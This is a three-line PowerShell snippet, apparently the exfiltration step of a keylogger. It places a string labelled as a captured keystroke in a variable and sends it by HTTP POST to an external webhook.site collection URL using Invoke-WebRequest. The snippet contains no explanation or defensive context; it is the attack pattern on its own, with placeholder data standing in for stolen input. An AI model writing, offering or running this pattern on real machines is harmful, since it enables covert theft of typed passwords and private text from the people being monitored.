
$data = "Captured keystroke example"
$webhookUrl = "https://webhook.site/b620ae52-906d-433a-a17c-8cd91ef5e1ae"
Invoke-WebRequest -Uri $webhookUrl -Method POST -Body @{data=$data}
